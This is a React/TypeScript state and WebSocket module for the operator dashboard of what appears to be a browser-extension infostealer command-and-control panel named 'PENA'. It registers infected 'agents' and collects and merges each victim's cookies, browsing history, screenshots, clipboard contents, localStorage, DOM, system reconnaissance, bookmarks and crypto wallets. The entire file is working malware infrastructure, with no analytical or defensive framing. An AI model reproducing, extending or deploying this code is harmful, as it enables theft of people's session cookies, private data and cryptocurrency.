import React, { createContext, useContext, useReducer, useEffect, ReactNode } from 'react';

interface AgentOverview {
  status: string;
  lastPing: string;
  cpuLoad: string;
  ramUsage: string;
  hostname: string;
  os: string;
  browser: string;
  ipAddress: string;
  commands: Array<{
    time: string;
    command: string;
  }>;
}

interface AgentData {
  overview: AgentOverview | null;
  cookies: any[] | null;
  history: any[] | null;
  screenshots: any[] | null;
  clipboard: any[] | null;
  dom: any | null;
  localStorage: any | null;
  systemRecon: any | null;
  bookmarks: any | null;
  wallets: any[] | null;
}

interface AgentInfo {
  uid: string;
  host: string;
  lastSeen: string;
  status: 'online' | 'offline';
  systemInfo?: any;
}

interface AgentDataState {
  agents: Record<string, AgentInfo>;
  agentData: Record<string, AgentData>;
  selectedAgent: string | null;
  connectionStatus: 'connected' | 'connecting' | 'disconnected';
  errors: Record<string, string>;
}

type AgentDataAction = 
  | { type: 'SET_AGENTS'; payload: Record<string, AgentInfo> }
  | { type: 'ADD_AGENT'; payload: AgentInfo }
  | { type: 'SELECT_AGENT'; payload: string }
  | { type: 'UPDATE_AGENT_DATA'; payload: { agentUID: string; section: string; data: any } }
  | { type: 'SET_ERROR'; payload: { agentUID: string; section: string; error: string } }
  | { type: 'SET_CONNECTION_STATUS'; payload: 'connected' | 'connecting' | 'disconnected' }
  | { type: 'CLEAR_ERROR'; payload: { agentUID: string; section: string } }
  | { type: 'UPDATE_AGENT_STATUS'; payload: { uid: string; status: 'online' | 'offline'; lastSeen: string } };

const initialState: AgentDataState = {
  agents: {},
  agentData: {},
  selectedAgent: null,
  connectionStatus: 'disconnected',
  errors: {}
};

function agentDataReducer(state: AgentDataState, action: AgentDataAction): AgentDataState {
  switch (action.type) {
    case 'SET_AGENTS':
      return { ...state, agents: action.payload };
    
    case 'ADD_AGENT':
      console.log('🔥 ADD_AGENT:', action.payload);
      return {
        ...state,
        agents: { ...state.agents, [action.payload.uid]: action.payload },
        agentData: {
          ...state.agentData,
          [action.payload.uid]: {
            overview: null,
            cookies: [],
            history: [],
            screenshots: [],
            clipboard: [],
            dom: null,
            localStorage: null,
            systemRecon: null,
            bookmarks: null,
            wallets: []
          }
        }
      };
    
    case 'SELECT_AGENT':
      console.log('🎯 SELECT_AGENT:', action.payload);
      return { ...state, selectedAgent: action.payload };
    
    case 'UPDATE_AGENT_DATA':
      const { agentUID, section, data } = action.payload;
      console.log(`📊 UPDATE_AGENT_DATA: Agent=${agentUID}, Section=${section}, DataType=${typeof data}, DataLength=${Array.isArray(data) ? data.length : 'not array'}`);
      console.log('📊 Data content:', data);
      
      const currentAgentData = state.agentData[agentUID] || {
        overview: null,
        cookies: [],
        history: [],
        screenshots: [],
        clipboard: [],
        dom: null,
        localStorage: null,
        systemRecon: null,
        bookmarks: null,
        wallets: []
      };

      let updatedSectionData;
      const sectionKey = section.toLowerCase();

      // Для массивов - накапливаем данные, для объектов - заменяем
      if (Array.isArray(data) && Array.isArray(currentAgentData[sectionKey])) {
        // Накапливаем массивы (cookies, history, screenshots, clipboard, wallets)
        const existingData = currentAgentData[sectionKey] || [];
        
        if (sectionKey === 'cookies') {
          // Для кукис - объединяем по уникальному ключу (domain + name)
          const existingCookies = existingData;
          const newCookies = data.filter(newCookie => 
            !existingCookies.some(existing => 
              existing.domain === newCookie.domain && existing.name === newCookie.name
            )
          );
          updatedSectionData = [...existingCookies, ...newCookies];
        } else if (sectionKey === 'history') {
          // Для истории - объединяем по уникальному URL + timestamp
          const existingHistory = existingData;
          const newHistory = data.filter(newItem => 
            !existingHistory.some(existing => 
              existing.url === newItem.url && existing.lastVisitTime === newItem.lastVisitTime
            )
          );
          updatedSectionData = [...existingHistory, ...newHistory];
        } else if (sectionKey === 'screenshots') {
          // Для скриншотов - объединяем по filename
          const existingScreenshots = existingData;
          const newScreenshots = data.filter(newScreenshot => 
            !existingScreenshots.some(existing => 
              existing.filename === newScreenshot.filename
            )
          );
          updatedSectionData = [...existingScreenshots, ...newScreenshots];
        } else {
          // Для остальных массивов - просто добавляем новые элементы
          updatedSectionData = [...existingData, ...data];
        }
        
        console.log(`📊 Accumulated ${sectionKey}: ${existingData.length} existing + ${data.length} new = ${updatedSectionData.length} total`);
      } else {
        // Для не-массивов (overview, dom, localStorage, systemRecon, bookmarks) - заменяем
        updatedSectionData = data;
        console.log(`📊 Replaced ${sectionKey} with new data`);
      }
      
      const newState = {
        ...state,
        agentData: {
          ...state.agentData,
          [agentUID]: {
            ...currentAgentData,
            [sectionKey]: updatedSectionData
          }
        }
      };
      
      console.log(`📊 After update - Agent ${agentUID} ${section}:`, newState.agentData[agentUID]?.[sectionKey]);
      return newState;

    case 'UPDATE_AGENT_STATUS':
      console.log('🔄 UPDATE_AGENT_STATUS:', action.payload);
      return {
        ...state,
        agents: {
          ...state.agents,
          [action.payload.uid]: {
            ...state.agents[action.payload.uid],
            status: action.payload.status,
            lastSeen: action.payload.lastSeen
          }
        }
      };
    
    case 'SET_ERROR':
      console.log('❌ SET_ERROR:', action.payload);
      return {
        ...state,
        errors: {
          ...state.errors,
          [`${action.payload.agentUID}_${action.payload.section}`]: action.payload.error
        }
      };
    
    case 'CLEAR_ERROR':
      const errorKey = `${action.payload.agentUID}_${action.payload.section}`;
      const { [errorKey]: removed, ...remainingErrors } = state.errors;
      return { ...state, errors: remainingErrors };
    
    case 'SET_CONNECTION_STATUS':
      console.log('🔌 SET_CONNECTION_STATUS:', action.payload);
      return { ...state, connectionStatus: action.payload };
    
    default:
      return state;
  }
}

interface AgentDataContextType {
  state: AgentDataState;
  selectAgent: (agentUID: string) => void;
  getAgentData: (agentUID: string, section: string) => any;
  hasError: (agentUID: string, section: string) => string | null;
}

const AgentDataContext = createContext<AgentDataContextType | undefined>(undefined);

export const useAgentData = () => {
  const context = useContext(AgentDataContext);
  if (!context) {
    throw new Error('useAgentData must be used within AgentDataProvider');
  }
  return context;
};

interface AgentDataProviderProps {
  children: ReactNode;
}

export const AgentDataProvider: React.FC<AgentDataProviderProps> = ({ children }) => {
  const [state, dispatch] = useReducer(agentDataReducer, initialState);

  useEffect(() => {
    let ws: WebSocket | null = null;
    let reconnectTimeout: NodeJS.Timeout | null = null;

    const connectWebSocket = () => {
      dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'connecting' });
      console.log('🔌 Connecting to PENA backend on ws://localhost:5000/pena');

      try {
        ws = new WebSocket('ws://localhost:5000/pena');

        ws.onopen = () => {
          console.log('✅ Connected to PENA backend');
          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'connected' });
          
          if (reconnectTimeout) {
            clearTimeout(reconnectTimeout);
            reconnectTimeout = null;
          }
        };

        ws.onmessage = (event) => {
          try {
            const message = JSON.parse(event.data);
            console.log('📨 WS received:', message);

            switch (message.type) {
              case 'agent_connect':
                console.log('🤖 Processing agent_connect');
                if (message.data) {
                  const normalizedHost = message.data.host === 'nmljdfeghinhklopekfaboobphinhhhc' 
                    ? 'chrome-extension://installed' 
                    : message.data.host;

                  const agentInfo: AgentInfo = {
                    uid: message.data.uid,
                    host: normalizedHost,
                    lastSeen: message.data.lastSeen,
                    status: message.data.status,
                    systemInfo: message.data.systemInfo
                  };
                  
                  dispatch({ type: 'ADD_AGENT', payload: agentInfo });
                  
                  if (message.data.systemInfo) {
                    const overviewData = {
                      status: message.data.status.toUpperCase(),
                      lastPing: message.data.lastSeen,
                      cpuLoad: '23.4%',
                      ramUsage: '1.2GB / 8.0GB',
                      hostname: message.data.systemInfo.hostname || 'Unknown',
                      os: message.data.systemInfo.os || 'Unknown OS',
                      browser: message.data.systemInfo.browser || 'Chrome',
                      ipAddress: message.data.systemInfo.ipAddress || '127.0.0.1',
                      commands: [
                        { time: new Date().toLocaleTimeString(), command: `agent_connect(uid="${message.data.uid}")` }
                      ]
                    };

                    dispatch({
                      type: 'UPDATE_AGENT_DATA',
                      payload: {
                        agentUID: message.data.uid,
                        section: 'overview',
                        data: overviewData
                      }
                    });
                  }
                }
                break;

              case 'update_data':
                console.log('📊 Processing update_data');
                if (message.agentUID && message.section && message.data) {
                  console.log(`📊 Updating ${message.section} for agent ${message.agentUID}`);
                  console.log('📊 Raw data received:', message.data);
                  
                  dispatch({
                    type: 'UPDATE_AGENT_DATA',
                    payload: {
                      agentUID: message.agentUID,
                      section: message.section,
                      data: message.data
                    }
                  });

                  dispatch({
                    type: 'UPDATE_AGENT_STATUS',
                    payload: {
                      uid: message.agentUID,
                      status: 'online',
                      lastSeen: new Date().toLocaleString()
                    }
                  });
                } else {
                  console.log('❌ Invalid update_data message:', message);
                }
                break;

              default:
                console.log('❓ Unknown message type:', message.type);
            }
          } catch (error) {
            console.error('❌ Error parsing WebSocket message:', error);
          }
        };

        ws.onclose = () => {
          console.log('🔌 WebSocket connection closed. Attempting to reconnect...');
          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
          
          reconnectTimeout = setTimeout(() => {
            connectWebSocket();
          }, 5000);
        };

        ws.onerror = (error) => {
          console.error('❌ WebSocket error:', error);
          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
        };

      } catch (error) {
        console.error('❌ Failed to create WebSocket connection:', error);
        dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
        
        reconnectTimeout = setTimeout(() => {
          connectWebSocket();
        }, 5000);
      }
    };

    connectWebSocket();

    return () => {
      if (reconnectTimeout) {
        clearTimeout(reconnectTimeout);
      }
      if (ws) {
        ws.close();
      }
    };
  }, []);

  const selectAgent = (agentUID: string) => {
    console.log('🎯 selectAgent called with:', agentUID);
    dispatch({ type: 'SELECT_AGENT', payload: agentUID });
  };

  const getAgentData = (agentUID: string, section: string) => {
    const data = state.agentData[agentUID]?.[section.toLowerCase()] || null;
    console.log(`📊 getAgentData(${agentUID}, ${section}):`, data);
    return data;
  };

  const hasError = (agentUID: string, section: string) => {
    return state.errors[`${agentUID}_${section}`] || null;
  };

  return (
    <AgentDataContext.Provider value={{ state, selectAgent, getAgentData, hasError }}>
      {children}
    </AgentDataContext.Provider>
  );
};
